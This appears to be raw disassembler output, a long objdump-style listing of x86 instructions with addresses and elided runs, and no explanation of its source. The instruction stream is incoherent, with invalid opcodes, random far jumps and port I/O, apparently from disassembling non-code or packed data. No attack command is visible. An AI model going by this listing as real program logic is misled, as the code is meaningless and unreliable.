  4196b3:	test   eax,0xdb681939
  4196b8:	jmp    0xf4649345
  4196bd:	adc    dl,BYTE PTR ds:0xa9915ad0
  4196c3:	inc    BYTE PTR [edi+0x6f]
  4196c6:	je     0x4196dd
  4196c8:	imul   ebp,DWORD PTR [edi],0xffffffcd
  4196cb:	(bad)  [ecx-0x72]
  4196ce:	pop    esi
  4196cf:	mov    ebp,esi
  4196d1:	test   DWORD PTR [esp+edx*8+0x378c26a2],ebx
  4196d8:	shl    al,1
  4196da:	inc    ecx
  4196db:	scas   al,BYTE PTR es:[edi]
  4196dc:	mul    BYTE PTR [esi+edx*4-0x649b5e38]
  4196e3:	pop    ebp
  4196e4:	stos   BYTE PTR es:[edi],al
  4196e5:	dec    esp
  4196e6:	mov    bl,0x9a
  4196e8:	aam    0xd4
  4196ea:	inc    esp
  4196eb:	inc    ebx
  4196ec:	fld    QWORD PTR [ecx]
  4196ee:	inc    eax
  4196ef:	pop    ds
  4196f0:	mov    ecx,0xfde52c2f
  4196f5:	jle    0x41967c
  4196f7:	cmp    cl,BYTE PTR [esi-0x2b]
  4196fa:	sbb    al,0x5f
  4196fc:	cdq    
  4196fd:	or     DWORD PTR [edi],0xffffffa9
  419700:	adc    esp,edx
  419702:	lea    ecx,[eax-0x71]
  419705:	inc    ebp
  419706:	out    dx,al
  419707:	dec    ecx
  419708:	mov    ch,0x8e
  41970a:	mov    BYTE PTR [ecx-0x2c5f5bc0],cl
  419710:	sbb    al,0x0
	...
  419772:	add    BYTE PTR [eax],al
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0xef8dd0ae
  419781:	mov    DWORD PTR [edx],ebp
  419783:	mov    cl,0x3
  419785:	push   cs
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x25000001
  41978d:	pop    ebp
  41978e:	sti    
  41978f:	ret    0x7375
  419792:	mov    eax,ds:0x1148969d
  419797:	xchg   esp,eax
  419798:	aas    
  419799:	and    bh,BYTE PTR [edx+0x69]
  41979c:	or     al,0xd8
  41979e:	dec    eax
  41979f:	in     al,0x72
  4197a1:	inc    esp
  4197a2:	data16 mov al,BYTE PTR [esi+esi*1-0x47641926]
  4197aa:	jbe    0x4197f3
  4197ac:	cmp    al,0x98
  4197af:	div    DWORD PTR [ebp-0x35]
  4197b2:	jns    0x4197b7
  4197b4:	aam    0x64
  4197b6:	inc    ebx
  4197b7:	inc    esp
  4197b8:	jnp    0x419831
  4197ba:	mov    ch,0xd0
  4197bc:	int3   
  4197bd:	out    dx,al
  4197be:	mov    esi,0xb7e4339
  4197c3:	pop    eax
  4197c4:	xorps  xmm0,xmm1
  4197c7:	nop
  4197c8:	aad    0xa3
  4197ca:	stos   DWORD PTR es:[edi],eax
  4197cb:	jb     0x41975e
  4197cd:	jo     0x419760
  4197cf:	xor    al,0x12
  4197d1:	sahf   
  4197d2:	iret   
  4197d3:	fs ret 0xfa57
  4197d7:	sti    
  4197d8:	in     eax,0x14
  4197da:	call   0x87fb5b6
  4197df:	inc    ecx
  4197e0:	mov    ebp,0x8b90fe6c
  4197e5:	fbld   TBYTE PTR [edx+0x62bf938b]
  4197eb:	or     BYTE PTR [edi+0x73],cl
  4197ee:	mov    dh,ah
  4197f0:	jno    0x419775
  4197f2:	cmp    ecx,esp
  4197f4:	daa    
  4197f5:	lock dec ebp
  4197f7:	int3   
  4197f8:	scas   eax,DWORD PTR es:[edi]
  4197f9:	pop    esp
  4197fa:	or     eax,0x649a2ba
  4197ff:	mov    ds:0x6b83e66,eax
  419804:	fnstenv [eax-0x738f70ff]
  41980a:	repnz xchg ecx,eax
  41980c:	stc    
  41980d:	or     al,0x23
  41980f:	dec    ebx
  419810:	into   
  419811:	xchg   ebp,eax
  419812:	shl    DWORD PTR [ebx-0xec8bba],0x4a
  419819:	xor    al,0x12
  41981b:	ror    DWORD PTR [edx+0x296ea04e],1
  419821:	and    dh,BYTE PTR [esp+ecx*4]
  419824:	and    eax,0x8b2b3ad6
  419829:	daa    
  41982a:	call   0x53e9:0x7dac2207
  419831:	ret    
  419832:	mov    al,ds:0x44b061c4
  419837:	mov    WORD PTR [eax+0xebcb065],cs
  41983d:	enter  0x6c39,0xcf
  419841:	mov    ch,0x53
  419843:	adc    al,0xb0
  419845:	or     ebp,ebx
  419847:	pushf  
  419848:	inc    edi
  419849:	adc    dh,cl
  41984b:	fs mov dl,0x7c
  41984e:	adc    DWORD PTR [edx+0x49b660bb],0x76f7ef34
  419858:	push   edx
  419859:	dec    esi
  41985a:	cmp    BYTE PTR [edx+0x7e9398d5],bl
  419860:	inc    ecx
  419861:	call   0x30b48b95
  419866:	add    edi,ebp
  419868:	or     dh,BYTE PTR [eax+0x16]
  41986b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41986c:	push   eax
  41986d:	xor    BYTE PTR [edx],bh
  41986f:	mov    dh,0x1d
  419871:	sub    DWORD PTR [edx-0x60],0xffffffbd
  419875:	adc    eax,0x6e454c1d
  41987a:	and    BYTE PTR [edi],bh
  41987c:	adc    al,0x65
  41987e:	jno    0x4198a2
  419880:	xor    BYTE PTR [ebx-0x7b],al
  419883:	inc    edx
  419884:	aad    0xce
  419886:	adc    ebx,esi
  419888:	lahf   
  419889:	not    BYTE PTR [eax-0x26]
  41988c:	cmp    esi,DWORD PTR [ebp-0x78]
  41988f:	adc    eax,0x63
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fnstsw WORD PTR [edi+0x894719e]
  419905:	sgdtd  [eax]
  419908:	add    eax,0xc9000001
  41990d:	outs   dx,BYTE PTR ds:[esi]
  41990e:	or     cl,dl
  419910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419911:	repnz dec ebp
  419913:	inc    esi
  419914:	jge    0x41995f
  419916:	dec    edi
  419917:	repnz dec ecx
  419919:	adc    BYTE PTR [esi],dl
  41991b:	mov    ecx,0xa8bc32f7
  419920:	mov    ?,WORD PTR [edx]
  419922:	in     al,dx
  419923:	popf   
  419924:	shl    cl,1
  419926:	in     al,dx
  419927:	mov    eax,ds:0x157274bc
  41992c:	push   esi
  41992d:	mov    edi,DWORD PTR [esi+0x4c]
  419930:	and    eax,0xd4ad23b1
  419935:	fwait
  419936:	ds (bad) 
  419938:	loopne 0x419997
  41993a:	mov    cl,dl
  41993c:	out    0x91,al
  41993e:	cli    
  41993f:	or     eax,0x297dba32
  419944:	xchg   esp,eax
  419945:	or     eax,0xe6d0e1ab
  41994a:	jge    0x4198e2
  41994c:	inc    edx
  41994d:	les    eax,FWORD PTR [eax]
  41994f:	fdivr  st(4),st
  419951:	cwde   
  419952:	test   al,0x31
  419954:	in     al,0x4
  419956:	stos   BYTE PTR es:[edi],al
  419957:	out    0x8,al
  419959:	pop    eax
  41995a:	mov    bh,0x4f
  41995c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41995d:	jo     0x4198eb
  41995f:	mov    dl,0xcc
  419961:	icebp  
  419962:	popf   
  419963:	(bad)  
  419964:	jbe    0x41997c
  419966:	mov    ecx,DWORD PTR [ebp+0x29a476e1]
  41996c:	add    ch,BYTE PTR [edx+eiz*4-0x5a]
  419970:	sub    ecx,eax
  419972:	xchg   esp,eax
  419973:	stos   BYTE PTR es:[edi],al
  419974:	mov    al,0xc0
  419977:	sub    dh,cl
  419979:	or     dl,BYTE PTR [ebp-0x36]
  41997c:	repz push ecx
  41997e:	mov    edx,0x8948b9ad
  419983:	push   es
  419984:	push   ebx
  419985:	cmp    dl,BYTE PTR [ebx+0x32]
  419988:	(bad)  
  419989:	aas    
  41998a:	out    0x55,eax
  41998c:	mov    ah,0xa3
  41998e:	les    edx,FWORD PTR [edi-0x76]
  419991:	aam    0x30
  419993:	call   0x6868:0x75818331
  41999a:	mov    eax,ds:0x8907eed2
  41999f:	xchg   ebp,eax
  4199a0:	xchg   ecx,eax
  4199a1:	out    dx,al
  4199a2:	iret   
  4199a3:	sti    
  4199a4:	fcmovnbe st,st(6)
  4199a6:	push   ds
  4199a7:	push   esi
  4199a8:	test   BYTE PTR [ebp+0x5f],ch
  4199ab:	sub    DWORD PTR [edx-0x73e23150],ecx
  4199b1:	sbb    esi,DWORD PTR [eax+0x7ca1fcd]
  4199b7:	dec    ecx
  4199b8:	int3   
  4199b9:	fucom  st(5)
  4199bb:	ins    DWORD PTR es:[edi],dx
  4199bc:	dec    eax
  4199bd:	fdiv   DWORD PTR [edx+0x34]
  4199c0:	push   ecx
  4199c1:	(bad)  
  4199c3:	fisttp DWORD PTR [ecx+edi*4]
  4199c6:	psllq  mm3,QWORD PTR [eiz*2-0x5420f72d]
  4199ce:	mov    ecx,0xe047bb78
  4199d3:	add    DWORD PTR gs:[ebp+0x52592620],0xfd9bab87
  4199de:	xchg   edi,eax
  4199df:	sub    edx,DWORD PTR [eax+0x6e]
  4199e2:	arpl   WORD PTR [edx-0x1b2fdd2e],si
  4199e8:	ret    0xca5
  4199eb:	mov    dh,0xa6
  4199ed:	inc    ebx
  4199ee:	ins    BYTE PTR es:[edi],dx
  4199ef:	cmp    BYTE PTR [esi],0x7d
  4199f2:	test   al,0x25
  4199f4:	mov    dl,0x66
  4199f6:	sbb    eax,eax
  4199f8:	mov    eax,0x6b575ff3
  4199fd:	inc    eax
  4199fe:	and    ebx,DWORD PTR [esi]
  419a00:	stc    
  419a01:	pop    ebx
  419a02:	xor    dh,BYTE PTR [ebx+0x1]
  419a05:	jge    0x419a0f
  419a07:	mov    esi,0x9168adda
  419a0c:	sub    eax,0x1788f246
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x6ec215d3
  419a81:	pusha  
  419a82:	pushf  
  419a83:	cdq    
  419a84:	or     eax,0x5000110
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    bh,cl
  419a8d:	xor    edx,DWORD PTR [edi]
  419a8f:	into   
  419a90:	jmp    0x449b:0x44b4ce8d
  419a97:	scas   al,BYTE PTR es:[edi]
  419a98:	aas    
  419a99:	push   ecx
  419a9a:	adc    eax,0xba844ca8
  419a9f:	inc    edi
  419aa0:	fwait
  419aa1:	pop    esi
  419aa2:	out    0xb6,al
  419aa4:	mov    ah,0xee
  419aa6:	lahf   
  419aa7:	in     al,dx
  419aa8:	cmp    ah,ah
  419aaa:	xchg   edx,eax
  419aab:	push   edi
  419aac:	in     al,dx
  419aad:	or     eax,0xdcc634aa
  419ab2:	rol    DWORD PTR [ecx-0x21401b08],cl
  419ab8:	jl     0x419b1f
  419aba:	pop    esi
  419abb:	call   0xbd9e1a7f
  419ac0:	mov    ah,0x7a
  419ac2:	dec    esi
  419ac3:	sbb    DWORD PTR [ebx+0x16bdc004],ebx
  419ac9:	push   cs
  419aca:	dec    edi
  419acb:	jmp    0x419a92
  419acd:	pop    es
  419ace:	jg     0x419ad3
  419ad0:	fstp   TBYTE PTR [eax+eax*8-0x4f56dd86]
  419ad7:	or     esp,edi
  419ad9:	in     eax,dx
  419ada:	adc    DWORD PTR [edi-0x1d],ecx
  419add:	mov    esp,0x4616e8af
  419ae2:	mov    esi,DWORD PTR [edi-0x7]
  419ae5:	inc    edi
  419ae6:	bnd jne 0x419a96
  419ae9:	int3   
  419aea:	(bad)  
  419aec:	mov    ebx,0xde70ab9
  419af1:	ficomp WORD PTR [ebp+0x236cac1]
  419af7:	sbb    al,0xf6
  419afa:	mov    eax,ds:0x2aadbaa8
  419aff:	mov    esi,0x981478f9
  419b04:	jmp    0x3f3f:0x10620a6c
  419b0b:	xchg   ebx,eax
  419b0c:	fadd   QWORD PTR [ecx+0x6a]
  419b0f:	push   cs
  419b10:	lods   al,BYTE PTR ds:[esi]
  419b11:	scas   eax,DWORD PTR es:[edi]
  419b12:	ficom  WORD PTR [esi+0x2c2af243]
  419b18:	rcr    dl,1
  419b1a:	nop
  419b1b:	adc    DWORD PTR [eax+0x3f0ecbfa],ecx
  419b21:	jle    0x419afd
  419b23:	stc    
  419b24:	fwait
  419b25:	jnp    0x419ac8
  419b27:	push   edi
  419b28:	dec    esp
  419b29:	lods   al,BYTE PTR ds:[esi]
  419b2a:	and    BYTE PTR [eax-0x12eea118],ah
  419b30:	sbb    BYTE PTR [ebp+0x7f],bh
  419b33:	jnp    0x419b6b
  419b35:	sub    eax,DWORD PTR [edi-0x23120281]
  419b3b:	pop    ebx
  419b3c:	sbb    DWORD PTR [edi+0x10],esi
  419b3f:	imul   eax
  419b41:	adc    ch,bl
  419b43:	(bad)  
  419b44:	and    DWORD PTR [edi],eax
  419b46:	push   ebx
  419b47:	aad    0x84
  419b49:	fdivr  DWORD PTR [ebx+0x7cf17c88]
  419b4f:	and    esi,DWORD PTR [edi+0x1b]
  419b52:	rcl    DWORD PTR [eax],0x78
  419b55:	pop    ebp
  419b56:	and    eax,0x3064d2c7
  419b5b:	stos   DWORD PTR es:[edi],eax
  419b5c:	test   al,0xfc
  419b5e:	jecxz  0x419bbe
  419b60:	pop    ecx
  419b61:	adc    DWORD PTR [ebx+0x20],0x500a96bc
  419b68:	imul   ebp,eax,0x2bcb5910
  419b6e:	inc    esi
  419b6f:	add    al,0x5d
  419b71:	inc    ebp
  419b72:	iret   
  419b73:	popf   
  419b74:	push   es
  419b75:	int    0x91
  419b77:	mov    ebx,0xf62cf0d
  419b7c:	xor    al,0xad
  419b7e:	add    ch,BYTE PTR [ebx]
  419b80:	pop    es
  419b81:	xchg   edx,eax
  419b82:	loope  0x419b11
  419b84:	inc    ecx
  419b85:	and    DWORD PTR [esi+0x7c],esp
  419b88:	cli    
  419b89:	jo     0x419ba6
  419b8b:	mov    al,0x83
  419b8d:	in     eax,0x40
  419b8f:	mov    ?,WORD PTR [ebx+0x0]
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x5e
  419c01:	push   ss
  419c02:	lock mov esi,0x11112
  419c08:	add    eax,0x5f000001
  419c0d:	mov    dl,0xd9
  419c0f:	loopne 0x419bca
  419c11:	pop    edx
  419c12:	ror    esi,0x7c
  419c15:	push   0x58a7e14e
  419c1a:	cmc    
  419c1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c1c:	hlt    
  419c1d:	dec    BYTE PTR [eax]
  419c1f:	sbb    al,BYTE PTR ss:[edi-0x70]
  419c23:	pop    edi
  419c24:	mov    eax,ds:0xd238bacb
  419c29:	xchg   edx,eax
  419c2a:	test   DWORD PTR [edi+ebx*1-0x3a619cf4],esi
  419c31:	stos   BYTE PTR es:[edi],al
  419c32:	in     al,dx
  419c33:	cmp    al,0x67
  419c35:	sub    DWORD PTR [edx+0x5b],0x19
  419c39:	call   0xe381:0x6dbcc6ea
  419c40:	push   edx
  419c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c42:	jno    0x419cbf
  419c44:	push   edx
  419c45:	jbe    0x419cc1
  419c47:	xor    al,0xbe
  419c49:	sub    dl,BYTE PTR [eax+0x2be929d8]
  419c4f:	pop    eax
  419c50:	cwde   
  419c51:	adc    eax,0xd82a176a
  419c56:	test   al,0xd5
  419c58:	dec    BYTE PTR [eax+0xc]
  419c5b:	clc    
  419c5c:	lds    ebp,FWORD PTR [ebx-0x1c8320cb]
  419c62:	shr    ebp,0x15
  419c65:	mov    al,ds:0xe0f4c030
  419c6a:	fld    QWORD PTR [ecx-0x7]
  419c6d:	jae    0x419c78
  419c6f:	pop    ebp
  419c70:	dec    ebp
  419c71:	mov    edx,0xfab2f705
  419c76:	sub    ecx,edx
  419c78:	xor    eax,DWORD PTR [ebp+0x1d]
  419c7b:	lahf   
  419c7c:	cmp    eax,0xfce1478b
  419c81:	jle    0x419c36
  419c83:	sub    bh,BYTE PTR [ecx+0x35]
  419c86:	mov    dl,0xf1
  419c88:	outs   dx,BYTE PTR ds:[esi]
  419c89:	sbb    eax,0xd581bb0e
  419c8e:	das    
  419c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c90:	test   eax,0xbc46d03f
  419c95:	dec    ebx
  419c96:	mov    ecx,0x87e2eb72
  419c9b:	js     0x419cea
  419c9d:	(bad)  [edx+0x3933a578]
  419ca3:	hlt    
  419ca4:	xchg   ebx,eax
  419ca5:	jb     0x419cde
  419ca7:	xor    cl,BYTE PTR [ebp-0x2e]
  419caa:	js     0x419c6f
  419cac:	in     al,0x97
  419cae:	aam    0xef
  419cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cb1:	fstp   QWORD PTR [esi+0x6477bbd]
  419cb7:	push   ss
  419cb8:	mov    edi,0x7cc9e72
  419cbd:	or     ebx,DWORD PTR [ebx+0x7dffa75f]
  419cc3:	pop    edi
  419cc4:	fst    st(0)
  419cc6:	ins    DWORD PTR es:[edi],dx
  419cc7:	or     al,0x26
  419cc9:	jbe    0x419c9b
  419ccb:	out    dx,al
  419ccc:	cld    
  419ccd:	repnz test ebp,0xee69f982
  419cd4:	lock addr16 dec esi
  419cd7:	inc    ecx
  419cd8:	int    0x8f
  419cda:	aas    
  419cdb:	out    dx,al
  419cdc:	pop    eax
  419cdd:	pop    es
  419cde:	int3   
  419cdf:	jecxz  0x419d33
  419ce1:	sub    al,0x12
  419ce3:	aas    
  419ce4:	inc    edx
  419ce5:	das    
  419ce6:	fsub   DWORD PTR [ebx+eiz*2+0x7a22e93c]
  419ced:	adc    eax,0x9294c144
  419cf2:	push   cs
  419cf3:	fidiv  DWORD PTR [esi+0x1]
  419cf6:	jl     0x419d6c
  419cf8:	xchg   bl,dl
  419cfa:	fcomp  st(3)
  419cfc:	fimul  DWORD PTR [ecx+0x38]
  419cff:	ror    DWORD PTR [edi],0x36
  419d02:	jns    0x419cc5
  419d04:	loope  0x419d43
  419d06:	sbb    bl,al
  419d08:	adc    esi,DWORD PTR [edi]
  419d0a:	add    BYTE PTR [edx],dl
  419d0c:	mov    edi,0x52338f35
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fisub  DWORD PTR ss:[ebp+0x6a]
  419d82:	add    ah,cl
  419d84:	pop    ss
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x92000001,al
  419d8d:	and    al,0x7f
  419d8f:	test   dl,bh
  419d91:	add    DWORD PTR [eax-0x6fff5a9d],esi
  419d97:	dec    esp
  419d98:	sbb    DWORD PTR [esi+0x27],0xf8df52a9
  419d9f:	mov    esp,0x4fe2a4a9
  419da4:	in     eax,dx
  419da5:	cmp    eax,0x68a5fc5
  419daa:	mov    esp,0xcd15c09f
  419daf:	ret    0x7db5
  419db2:	push   eax
  419db3:	ins    BYTE PTR es:[edi],dx
  419db4:	ret    
  419db5:	iret   
  419db6:	adc    al,0xf4
  419db8:	push   ebp
  419db9:	retf   
  419dba:	inc    esp
  419dbb:	std    
  419dbc:	fstp   QWORD PTR [edi-0x17e876a0]
  419dc2:	cmp    al,0xe1
  419dc4:	fdiv   st,st(0)
  419dc6:	ret    0xc5dd
  419dc9:	mov    cl,0x13
  419dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dcc:	pushf  
  419dcd:	ror    esp,1
  419dcf:	int3   
  419dd0:	push   ebp
  419dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd2:	pop    es
  419dd3:	dec    ebx
  419dd4:	loope  0x419e4e
  419dd6:	jmp    0x419dce
  419dd8:	xchg   edx,eax
  419dd9:	ret    
  419dda:	jmp    0x558549fc
  419ddf:	int3   
  419de0:	nop
  419de1:	repz in eax,dx
  419de3:	and    ecx,DWORD PTR ds:0xe5c7b8d9
  419de9:	xchg   esp,eax
  419dea:	mov    BYTE PTR [edi],al
  419dec:	test   eax,0xd538152e
  419df1:	inc    ebp
  419df2:	and    eax,0xdd7d92dd
  419df7:	and    ah,BYTE PTR [ebx+0x59028bd1]
  419dfd:	fimul  WORD PTR [ebx+esi*2+0x1cc79136]
  419e04:	popa   
  419e05:	retf   
  419e06:	add    bl,BYTE PTR [ebp+0x348dcf6f]
  419e0c:	sub    al,0xd2
  419e0e:	mov    cl,0x4c
  419e10:	and    esp,esp
  419e12:	mov    ebx,0x64d2d19d
  419e17:	and    BYTE PTR [esi+0x47],dh
  419e1a:	xor    eax,0x917090f7
  419e1f:	push   esp
  419e20:	ret    
  419e21:	jmp    0x419e03
  419e23:	inc    ebp
  419e24:	mov    cl,0x9f
  419e26:	xchg   edi,eax
  419e27:	sbb    BYTE PTR [ebx],cl
  419e29:	pop    ss
  419e2a:	scas   eax,DWORD PTR es:[edi]
  419e2b:	xchg   ebp,ebx
  419e2d:	dec    edx
  419e2e:	xchg   esi,eax
  419e2f:	or     al,0x13
  419e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e32:	sbb    BYTE PTR [ecx+0x6a],cl
  419e35:	push   ds
  419e36:	mov    al,ds:0xafb016b5
  419e3b:	adc    eax,0xde0bad32
  419e40:	cmp    al,0x2c
  419e42:	pop    ecx
  419e43:	dec    edi
  419e44:	adc    ecx,DWORD PTR [ebx-0x28]
  419e47:	inc    esp
  419e48:	sub    DWORD PTR [edi+0x28d223c9],ebx
  419e4e:	mov    esi,0xcd65ab47
  419e53:	lods   eax,DWORD PTR ds:[esi]
  419e54:	or     BYTE PTR ds:0xa4530612,bh
  419e5a:	lea    eax,[edx]
  419e5c:	mov    ?,ebp
  419e5e:	mov    ch,0xc6
  419e60:	pop    esp
  419e61:	clc    
  419e62:	and    dl,BYTE PTR [edi+0x1e9a2091]
  419e68:	mov    cl,0xa
  419e6a:	mov    ah,bl
  419e6c:	retf   0x99c6
  419e6f:	cwde   
  419e70:	push   ebp
  419e71:	adc    cl,al
  419e73:	sahf   
  419e74:	cmp    bl,BYTE PTR [eax+eiz*1]
  419e77:	sbb    DWORD PTR [eax],ebp
  419e79:	xchg   ebx,eax
  419e7a:	push   ebx
  419e7b:	test   eax,0xf2f23c10
  419e80:	cli    
  419e81:	or     al,0xa7
  419e83:	in     al,0x34
  419e85:	not    BYTE PTR [esi+ecx*4]
  419e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e89:	fsubr  DWORD PTR [eax-0x41d03cf9]
  419e8f:	push   cs
  419e90:	mov    WORD PTR [eax],es
	...
  419ef2:	add    BYTE PTR [eax],al
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	inc    edx
  419f01:	enter  0x8298,0x1c
  419f05:	adc    eax,DWORD PTR [ecx]
  419f07:	add    BYTE PTR ds:0x88000001,al
  419f0d:	add    BYTE PTR [esi],cl
  419f0f:	mov    bh,0x4a
  419f11:	mov    edi,0x554866a3
  419f16:	jns    0x419f32
  419f18:	add    al,0xbd
  419f1a:	lds    esi,FWORD PTR [ebx+0x48]
  419f1d:	mov    fs:0x2ecd5f2a,al
  419f23:	jne    0x419ee2
  419f25:	pop    eax
  419f26:	mov    ebx,DWORD PTR [edi-0x3fd3969a]
  419f2c:	push   ebp
  419f2d:	push   edi
  419f2e:	fidiv  WORD PTR [ebp+0x12]
  419f31:	add    al,0xd7
  419f33:	lea    esp,[eax-0x7f]
  419f36:	or     edx,DWORD PTR [ebp+0x9]
  419f39:	inc    ecx
  419f3a:	push   edi
  419f3b:	mov    esp,DWORD PTR [eax]
  419f3d:	jge    0x419f23
  419f3f:	sub    DWORD PTR [edx],edx
  419f41:	or     BYTE PTR [edi-0xdad5627],ah
  419f47:	imul   ecx,DWORD PTR [edi+0x14],0x19
  419f4b:	pushf  
  419f4c:	mov    ds:0x67dffd3b,al
  419f51:	mov    ah,0xa9
  419f53:	lahf   
  419f54:	and    BYTE PTR [eax],ch
  419f56:	and    esi,edx
  419f58:	mov    al,cl
  419f5a:	das    
  419f5b:	iret   
  419f5c:	xchg   edi,eax
  419f5d:	xchg   ebx,eax
  419f5e:	mov    esi,0xf8b2737e
  419f63:	xor    BYTE PTR [esi],ah
  419f65:	test   eax,0x3c61a87b
  419f6a:	xor    DWORD PTR [ebp+0x595bbbe5],ecx
  419f70:	pushf  
  419f71:	inc    ebp
  419f72:	sti    
  419f73:	sub    al,0xb3
  419f75:	data16 xor BYTE PTR [ebx-0x34877c80],ch
  419f7c:	push   es
  419f7d:	mul    BYTE PTR [edi+0x7]
  419f80:	inc    edx
  419f81:	repnz inc edx
  419f83:	lods   eax,DWORD PTR ds:[esi]
  419f84:	rcr    DWORD PTR [edx],cl
  419f86:	mov    DWORD PTR [ecx+edi*8-0x77],eax
  419f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f8b:	mov    edi,0x89f94d2e
  419f90:	or     DWORD PTR [ecx],ebx
  419f92:	cld    
  419f93:	ja     0x419fd4
  419f95:	sti    
  419f96:	xchg   edi,eax
  419f97:	leave  
  419f98:	rol    BYTE PTR [ecx-0x65],0x50
  419f9c:	into   
  419f9d:	call   0x608881f5
  419fa2:	xchg   ecx,eax
  419fa3:	xchg   esp,eax
  419fa4:	adc    DWORD PTR [edi],eax
  419fa6:	mov    ch,0x7e
  419fa8:	mov    dl,0x6f
  419faa:	int3   
  419fab:	test   BYTE PTR [ecx+0x24],0x26
  419faf:	mov    WORD PTR [edi],gs
  419fb1:	je     0x419fb6
  419fb3:	add    ebp,esp
  419fb5:	pop    edx
  419fb6:	addr16 jmp 0x41a032
  419fb9:	and    BYTE PTR [ecx],0x8
  419fbc:	xor    eax,DWORD PTR [edi]
  419fbe:	pop    edx
  419fbf:	enter  0xab98,0x8e
  419fc3:	int    0x87
  419fc5:	cmp    edx,esi
  419fc7:	push   edx
  419fc8:	stos   DWORD PTR es:[edi],eax
  419fc9:	mov    DWORD PTR [edx-0x1e0161d9],eax
  419fcf:	outs   dx,BYTE PTR ds:[esi]
  419fd0:	jo     0x41a03e
  419fd2:	jge    0x419fcc
  419fd4:	xchg   ebp,eax
  419fd5:	pushf  
  419fd6:	enter  0x37ac,0xb9
  419fda:	outs   dx,DWORD PTR ds:[esi]
  419fdb:	pop    edx
  419fdc:	outs   dx,BYTE PTR ds:[esi]
  419fdd:	mov    ebp,0xf3da9353
  419fe2:	enter  0x8985,0xb5
  419fe6:	mov    ch,0x73
  419fe8:	mov    DWORD PTR [eax+eiz*8-0x2b0b115b],esp
  419fef:	into   
  419ff0:	sahf   
  419ff1:	mov    esp,0xd0e31022
  419ff6:	outs   dx,BYTE PTR ds:[esi]
  419ff7:	or     al,0x3d
  419ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ffa:	aaa    
  419ffb:	cmp    BYTE PTR [eax],0x82
  419ffe:	mov    edi,0x3629cb7b
  41a003:	dec    esp
  41a004:	adc    al,0x8c
  41a006:	andps  xmm1,xmm1
  41a009:	outs   dx,BYTE PTR ds:[esi]
  41a00a:	dec    ecx
  41a00b:	jbe    0x41a025
  41a00d:	sar    DWORD PTR [eax],cl
  41a00f:	jns    0x419ff7
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x25],bh
  41a081:	and    eax,0x14218af7
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    eax,0xc8000001
  41a08d:	mov    cs,WORD PTR [esi-0x39]
  41a090:	sub    BYTE PTR [esi-0x3f9e7314],ch
  41a096:	clc    
  41a097:	dec    edx
  41a098:	cmp    eax,0xa71ca6c0
  41a09d:	jmp    0x41a0fd
  41a09f:	leave  
  41a0a0:	sub    al,BYTE PTR [eax]
  41a0a2:	out    dx,al
  41a0a3:	in     eax,0x48
  41a0a5:	and    BYTE PTR [ebx+0x89ccc93],ch
  41a0ab:	call   0xe97c6acc
  41a0b0:	sahf   
  41a0b1:	jg     0x41a0c7
  41a0b3:	xchg   ebp,eax
  41a0b4:	mov    ds,WORD PTR [eax+ebx*2-0x3bff5b0]
  41a0bb:	xor    eax,0x38faa193
  41a0c0:	mov    al,BYTE PTR [eax-0x4964f760]
  41a0c6:	shl    BYTE PTR [eax+0x49e11c1e],1
  41a0cc:	adc    ebx,DWORD PTR [eax]
  41a0ce:	or     al,0xb2
  41a0d0:	test   al,0x9
  41a0d2:	or     bh,BYTE PTR [ebp-0x6]
  41a0d5:	sbb    DWORD PTR [ebp+eiz*1-0x4db6ad63],ebp
  41a0dc:	outs   dx,DWORD PTR ds:[esi]
  41a0dd:	pop    edx
  41a0de:	fisub  DWORD PTR [edx-0x39]
  41a0e1:	call   0x50d:0x3889a560
  41a0e8:	out    dx,eax
  41a0e9:	int    0x5f
  41a0eb:	sbb    al,0xdb
  41a0ed:	cld    
  41a0ee:	push   ebx
  41a0ef:	sub    ecx,0xc9120517
